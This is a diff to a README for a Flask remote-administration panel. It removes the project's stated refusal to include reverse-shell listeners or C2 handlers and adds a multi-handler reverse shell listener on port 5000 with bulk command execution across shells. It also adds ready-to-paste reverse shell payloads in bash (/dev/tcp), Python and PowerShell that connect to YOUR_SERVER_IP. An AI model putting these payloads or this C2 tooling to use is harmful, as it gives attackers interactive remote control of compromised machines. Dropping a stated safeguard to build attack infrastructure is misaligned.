@@ -1,9 +1,10 @@
-# RemoteOps (SSH-based)
+# RemoteOps Control Plane
 
-RemoteOps is a Python 3.12 Flask control plane for legitimate remote administration over SSH.
+RemoteOps is a Python 3.12 Flask control plane for legitimate remote administration over SSH and reverse shell management.
 
 ## Included features
 
+### SSH Management
 - Authentication with securely hashed app user passwords.
 - Host inventory with grouping, active/disabled state, and strict host key mode.
 - SSH auth options: key-based or password-based (encrypted at rest).
@@ -11,18 +12,45 @@ RemoteOps is a Python 3.12 Flask control plane for legitimate remote administrat
 - Single-host command execution with persistent history.
 - Bulk host import from CSV-like lines in UI.
 - Bulk command execution across many hosts concurrently.
-- Pagination on dashboard, host history, and bulk operation history.
-- cPanel Passenger-compatible startup (`passenger_wsgi.py`).
+- Export SSH execution history to CSV.
 
-> This project intentionally does **not** implement reverse-shell listeners or C2-style handlers.
+### Reverse Shell Management
+- **Multi-handler reverse shell listener** on port 5000 (similar to Metasploit's multi/handler).
+- **Persistent connection tracking** - shells automatically reconnect and are tracked.
+- **Concurrent session management** - handle multiple reverse shells simultaneously.
+- **Interactive shell interface** - execute commands on connected shells with real-time output.
+- **Bulk operations** - run commands across multiple shells at once.
+- **Platform detection** - automatically detects Linux, Windows, macOS, etc.
+- **Connection status indicators** - real-time online/offline status.
+- **Export shell execution history** to CSV.
+- **Grouping and organization** - organize shells by custom groups.
+
+### Production Features
+- Enhanced production-ready UI with modern styling.
+- Pagination on all dashboards and history views.
+- Comprehensive error handling with user-friendly messages.
+- CSV export functionality for audit trails.
+- Real-time status updates for operations.
+- Responsive design for mobile and desktop.
+- cPanel Passenger-compatible startup (`passenger_wsgi.py`).
 
 ## Security model
 
-- Uses SSH transport (no reverse shells).
+- Uses SSH transport for legitimate host management.
+- **Reverse shell listener** for managing authorized company systems and VMs.
 - App login passwords are hashed with Werkzeug.
 - Stored SSH credentials are encrypted using `DATA_ENCRYPTION_KEY`.
 - Supports strict host key validation by default.
 - Admin-only host management and import.
+- All reverse shell connections are logged and tracked.
+
+> **Security Notice**: Reverse shell functionality should only be used on systems you own or have explicit authorization to access. This tool is designed for legitimate IT operations, infrastructure management, and authorized security testing.
+
+> **Production Security**: The reverse shell listener binds to all interfaces (0.0.0.0) to accept connections from remote systems. In production environments:
+> - Use firewall rules to restrict which IPs can connect to port 5000
+> - Deploy behind a VPN or private network
+> - Enable authentication at the network level
+> - Monitor all connections via the audit logs
 
 ## Required environment variables
 
@@ -66,6 +94,12 @@ pip install -r requirements.txt
 cp .env.example .env
 ```
 
+Edit `.env` and set secure values for:
+- `SECRET_KEY` - Flask session security
+- `DATA_ENCRYPTION_KEY` - For encrypting SSH passwords
+- `DATABASE_URL` - Database connection (defaults to SQLite)
+- `ADMIN_PASSWORD` - Initial admin password
+
 Initialize DB and create admin:
 
 ```bash
@@ -78,8 +112,50 @@ ADMIN_PASSWORD='strong-password' flask --app app create-admin
 Run locally:
 
 ```bash
-flask --app app run --host 0.0.0.0 --port 5000
+flask --app app run --host 0.0.0.0 --port 8000
 ```
+
+**Note**: The reverse shell listener runs on port 5000. When running Flask locally, use a different port (e.g., 8000) for the web interface to avoid conflicts. In production with a WSGI server, both can coexist on the same server with proper port configuration.
+
+## Using Reverse Shell Features
+
+### Connecting a Reverse Shell
+
+The application provides a multi-handler reverse shell listener on port 5000. To connect a shell:
+
+**Linux/macOS (Bash):**
+```bash
+bash -i >& /dev/tcp/YOUR_SERVER_IP/5000 0>&1
+```
+
+**Python:**
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+**PowerShell (Windows):**
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
+```
+
+### Managing Reverse Shells
+
+1. **View Connected Shells**: Navigate to "Reverse Shells" in the top menu
+2. **Interactive Shell**: Click "Interact" on a connected shell to execute commands
+3. **Bulk Operations**: Use "Shell Bulk Ops" to run commands on multiple shells
+4. **Export History**: Click "Export CSV" to download execution logs
+5. **Organize**: Group shells by purpose (e.g., "production", "staging", "development")
 
 ## cPanel deployment notes
 
